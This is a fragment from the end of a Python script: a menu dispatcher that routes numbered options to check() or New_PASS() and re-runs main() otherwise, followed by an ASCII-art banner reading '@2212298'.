    if Modes in ['1', '2', '3', '4','5' , '6' ,'7']:
        check(Modes)
    elif Modes == '8':New_PASS('2')
    elif Modes == '9':New_PASS('1')
    else:main()
main()
r"""
     /$$$$$$      /$$$$$$   /$$$$$$    /$$    /$$$$$$   /$$$$$$   /$$$$$$       
   /$$$__  $$$   /$$__  $$ /$$__  $$ /$$$$   /$$__  $$ /$$__  $$ /$$__  $$      
  /$$_/  \_  $$ |__/  \ $$|__/  \ $$|_  $$  |__/  \ $$| $$  \ $$| $$  \ $$      
 /$$/ /$$$$$  $$  /$$$$$$/  /$$$$$$/  | $$    /$$$$$$/|  $$$$$$$|  $$$$$$/      
| $$ /$$  $$| $$ /$$____/  /$$____/   | $$   /$$____/  \____  $$ >$$__  $$      
| $$| $$\ $$| $$| $$      | $$        | $$  | $$       /$$  \ $$| $$  \ $$      
| $$|  $$$$$$$$/| $$$$$$$$| $$$$$$$$ /$$$$$$| $$$$$$$$|  $$$$$$/|  $$$$$$/      
|  $$\________/ |________/|________/|______/|________/ \______/  \______/       
 \  $$$   /$$$                                                                  
  \_  $$$$$$_/                                                                  
    \______/   
"""